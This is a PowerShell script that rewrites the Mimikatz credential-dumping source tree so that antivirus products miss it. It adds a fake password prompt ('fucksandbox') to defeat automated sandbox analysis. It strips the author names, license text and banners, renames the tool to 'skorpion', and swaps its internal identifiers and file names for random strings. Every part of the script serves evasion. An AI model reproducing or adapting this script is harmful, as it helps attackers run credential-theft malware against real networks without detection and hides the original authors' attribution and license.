cls

$main_file = Get-ChildItem -Path .\mimikatz-master\mimikatz | Where-Object {$_.Name -like "mimikatz.c"}
$container_main_file = $main_file.DirectoryName + "\" + $main_file.name
$refer = 'int wmain(int argc, wchar_t * argv[])'

$var_Password_code=@'


int wmain(int argc, wchar_t * argv[])
{


    char username[15];
	char password[12];


	printf("FUCK SANDBOX:\n");
	scanf_s("%s", &username, (unsigned)_countof(username));

	printf("Repeat!!! FUCK SANDBOX:\n");
	scanf_s("%s", &password, (unsigned)_countof(password));

	if (strcmp(username, "fucksandbox") == 0) {
		if (strcmp(password, "fucksandbox") == 0) {

			printf("\nWelcome.OH Yeaaa!");


		}
		else {
			printf("\nwrong password");
		}
	}
	else {
		printf("\nUser doesn't exist");
	}
    /* 
'@


$new =Get-Content $container_main_file 
$new2  = $new.Replace( "$refer","$var_Password_code" ) | Set-Content $container_main_file


############## SECOND ADJUST ##########################


$re = [regex]'NTSTATUS status = STATUS_SUCCESS;'


$re.Replace([string]::Join("`n", (gc $container_main_file)), '*/ NTSTATUS status = STATUS_SUCCESS;', 1) | Set-Content $container_main_file

#######################################################

$nojoinkey1 = get-random -input A,B,C,D,E,F,G,H,I,L,M,N,O,P,Q,R,S,T,U,V,Z,X,Y,W,K,J -count 7
$skorpion_r_var  = $nojoinkey1 -join ''
$skorpion_r_var += "_"
$skorpion_r_var

$nojoinkey2 = get-random -input A,B,C,D,E,F,G,H,I,L,M,N,O,P,Q,R,S,T,U,V,Z,X,Y,W,K,J -count 7
$skorp_r_var  = $nojoinkey2 -join ''
$skorp_r_var += "_"
$skorp_r_var

$nojoinkey3 = get-random -input A,B,C,D,E,F,G,H,I,L,M,N,O,P,Q,R,S,T,U,V,Z,X,Y,W,K,J -count 7
$skp_r_var  = $nojoinkey3 -join ''
$skp_r_var += "_"
$skp_r_var



$dir = Get-Location
$mod = $dir.Path + "\mimikatz-master\mimikatz"
Rename-Item $mod "skorpion"

$All_Files = Get-ChildItem -Path .\mimikatz-master -recurse -Exclude "sqlite3.c","sqlite3.h" | Where-Object {$_.Name -like "*.*"}

ForEach($File_all in $All_Files) 
{
    
    if ($File_all -like "*.sln")
    {
    $container_file = $File_all.DirectoryName + "\" + $File_all.name
       
    #####
     (Get-Content $container_file) -replace 'Standard module  [Basic commands (does not require module name)]', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'Crypto Module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'SekurLSA module  [Some commands to enumerate credentials...]', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'Kerberos package module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'Next Generation Cryptography module (VYEZHQW_ use only)  [Some commands to enumerate credentials...]', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'Privilege module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'Process module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'Service module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'LsaDump module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'Terminal Server module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'Event module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'Miscellaneous module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'Token manipulation module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'Windows Vault/Credential module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'MineSweeper module', " "| Set-Content $container_file
     #(Get-Content $container_file) -replace 'net  -
     (Get-Content $container_file) -replace 'DPAPI Module (by API or RAW access)  [Data Protection application programming interface]', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'BusyLight Module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'System Environment Value module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'Security Identifiers module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'IIS XML Config module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'RPC control of skorpion', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'RF module for SR98 device and T5577 target', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'RF module for RDM(830 AL) device', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'ACR Module', " "| Set-Content $container_file

    (Get-Content $container_file) -replace 'Licence : https://creativecommons.org/licenses/by/4.0/', " "| Set-Content $container_file
       (Get-Content $container_file) -replace 'A La Vie', " "| Set-Content $container_file
     (Get-Content $container_file) -replace '.## ^ ##.  "A La Vie, A L', " "| Set-Content $container_file
    (Get-Content $container_file) -replace ' - (oe.eo)', " "| Set-Content $container_file
    (Get-Content $container_file) -replace '  .#####.   ', " "| Set-Content $container_file
    (Get-Content $container_file) -replace ' .## ^ ##.  ', " "| Set-Content $container_file
    (Get-Content $container_file) -replace ' ## / \\ ##  /' , " "| Set-Content $container_file
    (Get-Content $container_file) -replace 'DELPY', " "| Set-Content $container_file
    (Get-Content $container_file) -replace 'gentilkiwi', "DEV"| Set-Content $container_file
    (Get-Content $container_file) -replace 'benjamin', "DEV"| Set-Content $container_file
    (Get-Content $container_file) -replace ' ## \\ / ##       > https://blog.gentilkiwi.com/mimikatz', " "| Set-Content $container_file
    (Get-Content $container_file) -replace '## v ##', " "| Set-Content $container_file
    (Get-Content $container_file) -replace 'mysmartlogon', "DEV "| Set-Content $container_file
    (Get-Content $container_file) -replace 'Vincent LE TOUX', "DEV "| Set-Content $container_file
    (Get-Content $container_file) -replace 'vincent.letoux', "DEV "| Set-Content $container_file
    (Get-Content $container_file) -replace 'pingcastle', "DEV"| Set-Content $container_file
    ######
    (Get-Content $container_file) -replace "kiwi","$skorpion_r_var" | Set-Content $container_file
    (Get-Content $container_file) -replace "mimikatz","skorpion" | Set-Content $container_file
    (Get-Content $container_file) -replace "kuhl_","$skorp_r_var" | Set-Content $container_file
    (Get-Content $container_file) -replace "kull_","$skp_r_var" | Set-Content $container_file
    write-host -ForegroundColor Yellow "[+] [PARSED] "$container_file
    }
    elseif ($File_all -like "*.h")
    {

    $container_file = $File_all.DirectoryName + "\" + $File_all.name
    #####
    (Get-Content $container_file) -replace 'Standard module  [Basic commands (does not require module name)]', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'Crypto Module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'SekurLSA module  [Some commands to enumerate credentials...]', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'Kerberos package module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'Next Generation Cryptography module (VYEZHQW_ use only)  [Some commands to enumerate credentials...]', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'Privilege module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'Process module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'Service module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'LsaDump module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'Terminal Server module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'Event module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'Miscellaneous module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'Token manipulation module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'Windows Vault/Credential module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'MineSweeper module', " "| Set-Content $container_file
     #(Get-Content $container_file) -replace 'net  -
     (Get-Content $container_file) -replace 'DPAPI Module (by API or RAW access)  [Data Protection application programming interface]', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'BusyLight Module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'System Environment Value module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'Security Identifiers module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'IIS XML Config module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'RPC control of skorpion', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'RF module for SR98 device and T5577 target', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'RF module for RDM(830 AL) device', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'ACR Module', " "| Set-Content $container_file
    (Get-Content $container_file) -replace 'Licence : https://creativecommons.org/licenses/by/4.0/', " "| Set-Content $container_file
       (Get-Content $container_file) -replace 'A La Vie', " "| Set-Content $container_file
     (Get-Content $container_file) -replace '.## ^ ##.  "A La Vie, A L', " "| Set-Content $container_file
    (Get-Content $container_file) -replace ' - (oe.eo)', " "| Set-Content $container_file
    (Get-Content $container_file) -replace '  .#####.   ', " "| Set-Content $container_file
    (Get-Content $container_file) -replace ' .## ^ ##.  ', " "| Set-Content $container_file
    (Get-Content $container_file) -replace ' ## / \\ ##  /' , " "| Set-Content $container_file
    (Get-Content $container_file) -replace 'DELPY', " "| Set-Content $container_file
    (Get-Content $container_file) -replace 'gentilkiwi', "DEV"| Set-Content $container_file
    (Get-Content $container_file) -replace 'benjamin', "DEV"| Set-Content $container_file
    (Get-Content $container_file) -replace ' ## \\ / ##       > https://blog.gentilkiwi.com/mimikatz', " "| Set-Content $container_file
    (Get-Content $container_file) -replace '## v ##', " "| Set-Content $container_file
    (Get-Content $container_file) -replace 'mysmartlogon', "DEV "| Set-Content $container_file
    (Get-Content $container_file) -replace 'Vincent LE TOUX', "DEV "| Set-Content $container_file
    (Get-Content $container_file) -replace 'vincent.letoux', "DEV "| Set-Content $container_file
    (Get-Content $container_file) -replace 'pingcastle', "DEV"| Set-Content $container_file
    ######
    (Get-Content $container_file) -replace "kiwi","$skorpion_r_var" | Set-Content $container_file
    (Get-Content $container_file) -replace "mimikatz","skorpion" | Set-Content $container_file
    (Get-Content $container_file) -replace "kuhl_","$skorp_r_var" | Set-Content $container_file
    (Get-Content $container_file) -replace "kull_","$skp_r_var" | Set-Content $container_file
    write-host -ForegroundColor Yellow "[+] [PARSED] "$container_file
    }
    elseif ($File_all -like "*.c")
    {
    $container_file = $File_all.DirectoryName + "\" + $File_all.name
    #####
    (Get-Content $container_file) -replace 'Standard module  [Basic commands (does not require module name)]', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'Crypto Module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'SekurLSA module  [Some commands to enumerate credentials...]', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'Kerberos package module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'Next Generation Cryptography module (VYEZHQW_ use only)  [Some commands to enumerate credentials...]', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'Privilege module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'Process module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'Service module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'LsaDump module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'Terminal Server module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'Event module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'Miscellaneous module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'Token manipulation module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'Windows Vault/Credential module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'MineSweeper module', " "| Set-Content $container_file
     #(Get-Content $container_file) -replace 'net  -
     (Get-Content $container_file) -replace 'DPAPI Module (by API or RAW access)  [Data Protection application programming interface]', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'BusyLight Module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'System Environment Value module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'Security Identifiers module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'IIS XML Config module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'RPC control of skorpion', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'RF module for SR98 device and T5577 target', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'RF module for RDM(830 AL) device', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'ACR Module', " "| Set-Content $container_file
    (Get-Content $container_file) -replace 'Licence : https://creativecommons.org/licenses/by/4.0/', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'A La Vie', " "| Set-Content $container_file
     (Get-Content $container_file) -replace '.## ^ ##.  "A La Vie, A L', " "| Set-Content $container_file
    (Get-Content $container_file) -replace ' - (oe.eo)', " "| Set-Content $container_file
    (Get-Content $container_file) -replace '  .#####.   ', " "| Set-Content $container_file
    (Get-Content $container_file) -replace ' .## ^ ##.  ', " "| Set-Content $container_file
    (Get-Content $container_file) -replace ' ## / \\ ##  /' , " "| Set-Content $container_file
    (Get-Content $container_file) -replace 'DELPY', " "| Set-Content $container_file
    (Get-Content $container_file) -replace 'gentilkiwi', "DEV"| Set-Content $container_file
    (Get-Content $container_file) -replace 'benjamin', "DEV"| Set-Content $container_file
    (Get-Content $container_file) -replace ' ## \\ / ##       > https://blog.gentilkiwi.com/mimikatz', " "| Set-Content $container_file
    (Get-Content $container_file) -replace '## v ##', " "| Set-Content $container_file
    (Get-Content $container_file) -replace 'mysmartlogon', "DEV "| Set-Content $container_file
    (Get-Content $container_file) -replace 'Vincent LE TOUX', "DEV "| Set-Content $container_file
    (Get-Content $container_file) -replace 'vincent.letoux', "DEV "| Set-Content $container_file
    (Get-Content $container_file) -replace 'pingcastle', "DEV"| Set-Content $container_file
    ######
    (Get-Content $container_file) -replace "kiwi","$skorpion_r_var" | Set-Content $container_file
    (Get-Content $container_file) -replace "mimikatz","skorpion" | Set-Content $container_file
    (Get-Content $container_file) -replace "kuhl_","$skorp_r_var" | Set-Content $container_file
    (Get-Content $container_file) -replace "kull_","$skp_r_var" | Set-Content $container_file
    write-host -ForegroundColor Yellow "[+] [PARSED] "$container_file
    }
    elseif ($File_all -like "*.filters")
    {
    $container_file = $File_all.DirectoryName + "\" + $File_all.name
    #####
    (Get-Content $container_file) -replace 'Standard module  [Basic commands (does not require module name)]', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'Crypto Module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'SekurLSA module  [Some commands to enumerate credentials...]', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'Kerberos package module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'Next Generation Cryptography module (VYEZHQW_ use only)  [Some commands to enumerate credentials...]', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'Privilege module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'Process module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'Service module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'LsaDump module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'Terminal Server module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'Event module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'Miscellaneous module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'Token manipulation module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'Windows Vault/Credential module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'MineSweeper module', " "| Set-Content $container_file
     #(Get-Content $container_file) -replace 'net  -
     (Get-Content $container_file) -replace 'DPAPI Module (by API or RAW access)  [Data Protection application programming interface]', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'BusyLight Module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'System Environment Value module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'Security Identifiers module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'IIS XML Config module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'RPC control of skorpion', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'RF module for SR98 device and T5577 target', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'RF module for RDM(830 AL) device', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'ACR Module', " "| Set-Content $container_file
    (Get-Content $container_file) -replace 'Licence : https://creativecommons.org/licenses/by/4.0/', " "| Set-Content $container_file
      (Get-Content $container_file) -replace 'A La Vie', " "| Set-Content $container_file
     (Get-Content $container_file) -replace '.## ^ ##.  "A La Vie, A L', " "| Set-Content $container_file
    (Get-Content $container_file) -replace ' - (oe.eo)', " "| Set-Content $container_file
    (Get-Content $container_file) -replace '  .#####.   ', " "| Set-Content $container_file
    (Get-Content $container_file) -replace ' .## ^ ##.  ', " "| Set-Content $container_file
    (Get-Content $container_file) -replace ' ## / \\ ##  /' , " "| Set-Content $container_file
    (Get-Content $container_file) -replace 'DELPY', " "| Set-Content $container_file
    (Get-Content $container_file) -replace 'gentilkiwi', "DEV"| Set-Content $container_file
    (Get-Content $container_file) -replace 'benjamin', "DEV"| Set-Content $container_file
    (Get-Content $container_file) -replace ' ## \\ / ##       > https://blog.gentilkiwi.com/mimikatz', " "| Set-Content $container_file
    (Get-Content $container_file) -replace '## v ##', " "| Set-Content $container_file
    (Get-Content $container_file) -replace 'mysmartlogon', "DEV "| Set-Content $container_file
    (Get-Content $container_file) -replace 'Vincent LE TOUX', "DEV "| Set-Content $container_file
    (Get-Content $container_file) -replace 'vincent.letoux', "DEV "| Set-Content $container_file
    (Get-Content $container_file) -replace 'pingcastle', "DEV"| Set-Content $container_file
    ######
    (Get-Content $container_file) -replace "kiwi","$skorpion_r_var" | Set-Content $container_file
    (Get-Content $container_file) -replace "mimikatz","skorpion" | Set-Content $container_file
    (Get-Content $container_file) -replace "kuhl_","$skorp_r_var" | Set-Content $container_file
    (Get-Content $container_file) -replace "kull_","$skp_r_var" | Set-Content $container_file
    write-host -ForegroundColor Yellow "[+] [PARSED] "$container_file
    }
    elseif ($File_all -like "*.vcxproj")
    {
    $container_file = $File_all.DirectoryName + "\" + $File_all.name
    #####
    (Get-Content $container_file) -replace 'Standard module  [Basic commands (does not require module name)]', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'Crypto Module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'SekurLSA module  [Some commands to enumerate credentials...]', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'Kerberos package module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'Next Generation Cryptography module (VYEZHQW_ use only)  [Some commands to enumerate credentials...]', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'Privilege module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'Process module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'Service module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'LsaDump module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'Terminal Server module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'Event module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'Miscellaneous module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'Token manipulation module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'Windows Vault/Credential module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'MineSweeper module', " "| Set-Content $container_file
     #(Get-Content $container_file) -replace 'net  -
     (Get-Content $container_file) -replace 'DPAPI Module (by API or RAW access)  [Data Protection application programming interface]', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'BusyLight Module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'System Environment Value module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'Security Identifiers module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'IIS XML Config module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'RPC control of skorpion', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'RF module for SR98 device and T5577 target', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'RF module for RDM(830 AL) device', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'ACR Module', " "| Set-Content $container_file
    (Get-Content $container_file) -replace 'Licence : https://creativecommons.org/licenses/by/4.0/', " "| Set-Content $container_file
      (Get-Content $container_file) -replace 'A La Vie', " "| Set-Content $container_file
     (Get-Content $container_file) -replace '.## ^ ##.  "A La Vie, A L', " "| Set-Content $container_file
    (Get-Content $container_file) -replace ' - (oe.eo)', " "| Set-Content $container_file
    (Get-Content $container_file) -replace '  .#####.   ', " "| Set-Content $container_file
    (Get-Content $container_file) -replace ' .## ^ ##.  ', " "| Set-Content $container_file
    (Get-Content $container_file) -replace ' ## / \\ ##  /' , " "| Set-Content $container_file
    (Get-Content $container_file) -replace 'DELPY', " "| Set-Content $container_file
    (Get-Content $container_file) -replace 'gentilkiwi', "DEV"| Set-Content $container_file
    (Get-Content $container_file) -replace 'benjamin', "DEV"| Set-Content $container_file
    (Get-Content $container_file) -replace ' ## \\ / ##       > https://blog.gentilkiwi.com/mimikatz', " "| Set-Content $container_file
    (Get-Content $container_file) -replace '## v ##', " "| Set-Content $container_file
    (Get-Content $container_file) -replace 'mysmartlogon', "DEV "| Set-Content $container_file
    (Get-Content $container_file) -replace 'Vincent LE TOUX', "DEV "| Set-Content $container_file
    (Get-Content $container_file) -replace 'vincent.letoux', "DEV "| Set-Content $container_file
    (Get-Content $container_file) -replace 'pingcastle', "DEV"| Set-Content $container_file
    ######
    (Get-Content $container_file) -replace "kiwi","$skorpion_r_var" | Set-Content $container_file
    (Get-Content $container_file) -replace "mimikatz","skorpion" | Set-Content $container_file
    (Get-Content $container_file) -replace "kuhl_","$skorp_r_var" | Set-Content $container_file
    (Get-Content $container_file) -replace "kull_","$skp_r_var" | Set-Content $container_file
    write-host -ForegroundColor Yellow "[+] [PARSED] "$container_file
    }
    elseif ($File_all -like "*.rc")
    {
    $container_file = $File_all.DirectoryName + "\" + $File_all.name
    #####
    (Get-Content $container_file) -replace 'Standard module  [Basic commands (does not require module name)]', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'Crypto Module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'SekurLSA module  [Some commands to enumerate credentials...]', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'Kerberos package module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'Next Generation Cryptography module (VYEZHQW_ use only)  [Some commands to enumerate credentials...]', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'Privilege module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'Process module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'Service module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'LsaDump module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'Terminal Server module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'Event module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'Miscellaneous module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'Token manipulation module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'Windows Vault/Credential module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'MineSweeper module', " "| Set-Content $container_file
     #(Get-Content $container_file) -replace 'net  -
     (Get-Content $container_file) -replace 'DPAPI Module (by API or RAW access)  [Data Protection application programming interface]', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'BusyLight Module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'System Environment Value module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'Security Identifiers module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'IIS XML Config module', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'RPC control of skorpion', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'RF module for SR98 device and T5577 target', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'RF module for RDM(830 AL) device', " "| Set-Content $container_file
     (Get-Content $container_file) -replace 'ACR Module', " "| Set-Content $container_file
    (Get-Content $container_file) -replace 'Licence : https://creativecommons.org/licenses/by/4.0/', " "| Set-Content $container_file
       (Get-Content $container_file) -replace 'A La Vie', " "| Set-Content $container_file
     (Get-Content $container_file) -replace '.## ^ ##.  "A La Vie, A L', " "| Set-Content $container_file
    (Get-Content $container_file) -replace ' - (oe.eo)', " "| Set-Content $container_file
    (Get-Content $container_file) -replace '  .#####.   ', " "| Set-Content $container_file
    (Get-Content $container_file) -replace ' .## ^ ##.  ', " "| Set-Content $container_file
    (Get-Content $container_file) -replace ' ## / \\ ##  /' , " "| Set-Content $container_file
    (Get-Content $container_file) -replace 'DELPY', " "| Set-Content $container_file
    (Get-Content $container_file) -replace 'gentilkiwi', "DEV"| Set-Content $container_file
    (Get-Content $container_file) -replace 'benjamin', "DEV"| Set-Content $container_file
    (Get-Content $container_file) -replace ' ## \\ / ##       > https://blog.gentilkiwi.com/mimikatz', " "| Set-Content $container_file
    (Get-Content $container_file) -replace '## v ##', " "| Set-Content $container_file
    (Get-Content $container_file) -replace 'mysmartlogon', "DEV "| Set-Content $container_file
    (Get-Content $container_file) -replace 'Vincent LE TOUX', "DEV "| Set-Content $container_file
    (Get-Content $container_file) -replace 'vincent.letoux', "DEV "| Set-Content $container_file
    (Get-Content $container_file) -replace 'pingcastle', "DEV"| Set-Content $container_file
    ######
    (Get-Content $container_file) -replace "kiwi","$skorpion_r_var" | Set-Content $container_file
    (Get-Content $container_file) -replace "mimikatz","skorpion" | Set-Content $container_file
    (Get-Content $container_file) -replace "kuhl_","$skorp_r_var" | Set-Content $container_file
    (Get-Content $container_file) -replace "kull_","$skp_r_var" | Set-Content $container_file
    write-host -ForegroundColor Yellow "[+] [PARSED] "$container_file
    }
    #elseif ($File_all -like "*.rc"){write-host -ForegroundColor Red [-] Bypass RC }
    elseif  ($File_all -like "*.ico"){write-host -ForegroundColor Red "[-] Bypass ICO " $File_all}
    elseif  ($File_all -like "*.lib"){write-host -ForegroundColor Red "[-] Bypass LIB " $File_all}
    
    elseif  ($File_all -like "sqlite3.*"){write-host -ForegroundColor Red "[-] Bypass SQL " $File_all}
 }



$kuhl_Files =  Get-ChildItem -Path .\mimikatz-master -recurse | Where-Object {$_.Name -like "kuhl_*"}

ForEach($File_kuhl in $kuhl_Files) 
{
     
    $newname_kuhl = ([String]$File_kuhl).Replace("kuhl_","$skorp_r_var")
    $mio_kuhl = $File_kuhl.DirectoryName + "\" + $File_kuhl.name
    Rename-item -Path $mio_kuhl $newname_kuhl
    write-host -ForegroundColor Magenta "[+] [RENAMMED] "$mio_kuhl

}


$kull_Files =  Get-ChildItem -Path .\mimikatz-master -recurse | Where-Object {$_.Name -like "kull_*"}
ForEach($File_kull in $kull_Files) 
{
     
    $newname_kull = ([String]$File_kull).Replace("kull_","$skp_r_var")
    $mio_kull = $File_kull.DirectoryName + "\" + $File_kull.name
    Rename-item -Path $mio_kull $newname_kull
    write-host -ForegroundColor White "[+] [RENAMMED] "$mio_kull
}


$mimikatz_Files =  Get-ChildItem -Path .\mimikatz-master -recurse | Where-Object {$_.Name -like "mimikatz*"}

ForEach($File_mim in $mimikatz_Files) 
{
    
    $newname_mim = ([String]$File_mim).Replace("mimikatz","skorpion")
    $mio_mim = $file_mim.DirectoryName + "\" + $file_mim.name
    Rename-item -Path $mio_mim $newname_mim 
     write-host -ForegroundColor Red "[+] [RENAMMED] "$mio_mim
}